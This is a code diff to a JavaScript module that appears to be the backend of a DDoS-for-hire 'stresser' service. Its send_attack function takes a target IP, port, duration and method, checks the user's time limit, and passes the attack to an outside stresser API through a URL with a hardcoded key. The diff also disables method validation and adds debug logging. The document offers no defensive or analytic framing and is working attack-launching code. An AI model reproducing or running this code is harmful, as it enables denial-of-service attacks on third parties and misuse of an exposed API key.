@@ -85,26 +85,19 @@ exports.methodValidation = async function(meth) {
 }
 
 exports.send_attack = async function(ip, port, time, method, usr) {
-    let get_user = await Crud.GetUser(usr, "str");
-    let max_time = get_user.split(",")[4];
-
-    if(parseInt(time) > parseInt(max_time)) return "[x] Error, You've reached your max time!\r\n";
-    if(await this.methodValidation(method) == false) return "[x] Error, Invalid method!\r\n";
+    console.log("lol")
+    let get_user = await Crud.GetUser(usr, "arr");
+    console.log(get_user)
+    if(parseInt(time) > parseInt(get_user[3])) return "[x] Error, You've reached your max time!\r\n";
+    // if(await this.methodValidation(method) == false) return "[x] Error, Invalid method!\r\n";
 
     // this.log_action(usr, ip, port, time, method);
     let response = "";
     
-    let rreturn = await(await fetch("" + ip + "&port=" + port + "&time=" + time + "&method=" + method)).text();
+    console.log("lol")
+    let rreturn = await(await fetch("https://lunarapi.xyz/stresser/api/api.php?key=4C1wJ4oh82gHjHnu&host=" + ip + "&port=" + port + "&time=" + time + "&method=" + method)).text();
     console.log(rreturn);
-    response += "API 1: " + await this.get_api_response(rreturn) + "\r\n";
-
-    let rreturn1 = await(await fetch("" + ip + "&port=" + port + "&time=" + time + "&method=" + method)).text();
-    console.log(rreturn1);
-    response += "API 2: " + await this.get_api_response(rreturn1) + "\r\n";
-
-    let rreturn2 = await(await fetch("" + ip + "&port=" + port + "&time=" + time + "&method=" + method)).text();
-    console.log(rreturn2);
-    response += "API 3: " + await this.get_api_response(rreturn2) + "\r\n";
+    response += "                    API 1: " + await this.get_api_response(rreturn) + "\r\n";
     return response;
 }
 
